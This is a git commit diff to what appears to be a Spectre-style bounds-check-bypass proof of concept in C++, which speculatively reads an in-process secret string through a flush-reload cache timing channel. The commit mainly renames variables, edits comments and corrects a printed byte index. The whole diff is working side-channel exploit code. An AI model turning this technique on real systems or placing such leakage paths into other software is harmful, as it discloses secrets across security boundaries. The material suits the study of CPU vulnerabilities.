fb01efd380eac385befd6c5b85a1ff5dcb563477
Devashish <djaiswal@azul.com>
2026-09-18 16:25:29 +0530

    Report correct byte index when printing attempt

--- main.cpp
+++ main.cpp
@@ -13,12 +13,13 @@ using u64 = unsigned long long;
 // This is slightly problematic because 4096 aligned accesses are all going to target
 // the same set in L1, so if the secret happens to be more than 8b in an 8-way/32-KiB
 // L1D, then we'd lose some characters. But here we're banking on L2 misses rather than
-// L1. On Skylake-X the L2 cache is 16-way associative totaling 1 MiB in size. The
-// critical stride works out to be (1024 KiB << 10) / 16 = 65,536 bytes. We'd select
-// the same L2 set only when accesses are 65,536 bytes apart.
+// L1. On Skylake-X, the L2 cache is 16-way associative, 1 MiB in size. The critical
+// stride works out to be (1024 KiB << 10) / 16 = 65,536 bytes. We'd select the same L2
+// set when accesses are 65,536 bytes apart.
 #define PAGE_SZ 0x1000
 
-alignas(PAGE_SZ) u8 covert[256 * PAGE_SZ];
+#define N_COVERT_PAGES 256
+alignas(PAGE_SZ) u8 covert[N_COVERT_PAGES * PAGE_SZ];
 
 // Secret key can have any of these characters multiple times.
 // Actual value of `secret_space_length` is computed at program entry.
@@ -26,24 +27,24 @@ alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
 int secret_space_length = 0;
 
 #define ACCESS_BOUND 4
-alignas(PAGE_SZ) struct Data {
-    u8 values[ACCESS_BOUND] = {1, 2, 3, 4};     // 'get_value' doesn't guard this.
-    char secret[128] = "PWND_SECRET";           // 'get_value' does (well, should!) guard this.
+alignas(PAGE_SZ) struct SecretStruct {
+    u8 values[ACCESS_BOUND] = {1, 2, 3, 4};     // `get_value` doesn't guard this.
+    char secret[128] = "PWND_SECRET";           // `get_value` does (well, should!) guard this.
 
     // Bound checks must retrieve the bound from memory for flush-reload to work.
     volatile u8 NVALUES = ACCESS_BOUND;
-} S;
+} DATA;
 
 [[gnu::noinline]] u8 get_value(int idx, u8* covert) {
-    if (idx < S.NVALUES) {
-        // Every PAGE_SZ * S.values[idx] maps to a unique page in 'covert'.
+    if (idx < DATA.NVALUES) {
+        // Every PAGE_SZ * DATA.values[idx] maps to a unique page in `covert`.
         // Stream prefetchers don't cross page boundaries, so we are guaranteed
         // that accessing PAGE_SZ * 'B' won't accidentally prefetch PAGE_SZ * 'C'.
         // Accesses PAGE_SZ * ord('A'..'Z') touch memory in the range (base + 266'240)
-        // to (base + 368'640) where 'base' is the base address of 'covert'. This is
-        // fine because 'covert' spans over 256 distinct pages: from (base + 0) to
-        // (base + 1'048'576). Size of 'covert' also covers '_' if key includes it.
-        return covert[PAGE_SZ * (S.values[idx])];
+        // to (base + 368'640) where 'base' is the base address of `covert`. This is
+        // fine because `covert` spans over 256 distinct pages: from (base + 0) to
+        // (base + 1'048'576). Size of `covert` also covers '_' if key includes it.
+        return covert[PAGE_SZ * (DATA.values[idx])];
     }
     return 0;
 }
@@ -52,10 +53,9 @@ alignas(PAGE_SZ) struct Data {
 // covers the load. Without the fence, nothing stops rdtsc from reordering
 // with the load. We don't want that.
 inline u32 probe_latency(u8* addr) {
-    volatile u8 sink = 0;
     u64 t0 = __rdtsc();
     _mm_lfence();
-    sink = *addr;
+    volatile u8 sink = *addr;
     _mm_lfence();
     u64 t1 = __rdtsc();
     return (u32)(t1 - t0);
@@ -71,13 +71,13 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
         }
 
         // Flush the bound and the probe lines.
-        _mm_clflush((void*)&S.NVALUES);
+        _mm_clflush((void*)&DATA.NVALUES);
         for (int i = 0; i < secret_space_length; i++) {
             _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
         }
 
-        // Malign access. byte_idx > 4 is out of bounds. The misprediction speculatively
-        // reads S.secret through the covert channel
+        // Malign access. `byte_idx` > 4 is out of bounds. The misprediction speculatively
+        // reads `DATA.secret` through the covert channel.
         _mm_lfence();
         sum += get_value(byte_idx, covert);
 
@@ -94,7 +94,7 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
             return secret_space[i];
         }
     }
-    printf("Byte=%i, Recovery Attempt=%d\n", byte_idx, ntry + 1);
+    printf("Byte=%i, Recovery Attempt=%d\n", byte_idx - DATA.NVALUES, ntry + 1);
     if (ntry < 10000) {
         ntry += 1;
         return recover_byte(byte_idx, covert, threshold, hit_threshold, sum, ntry);
@@ -107,18 +107,18 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
 int main(int argc, char** argv) {
     u32 threshold = argc > 1 ? atoi(argv[1]) : 180;
     u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
-    int secret_length = strlen(S.secret);
+    int secret_length = strlen(DATA.secret);
     secret_space_length = strlen(secret_space);
 
-    // Prefault covert pages.
-    for (int i = 0; i < 256; i++) {
+    // Prefault covert pages. Can't afford TLB misses when probing cache lines.
+    for (int i = 0; i < N_COVERT_PAGES; i++) {
         covert[i * PAGE_SZ] = 1;
     }
 
     // Dummy value to prevent the compiler from eliding `get_value` calls.
     int sum = 0;
     char recovered_secret[secret_length + 1] = {0};
-    for (int idx = 4, k = 0; k < secret_length; idx++, k++) {
+    for (int idx = DATA.NVALUES, k = 0; k < secret_length; idx++, k++) {
         recovered_secret[k] = recover_byte(idx, covert, threshold, hit_threshold, sum);
     }
 
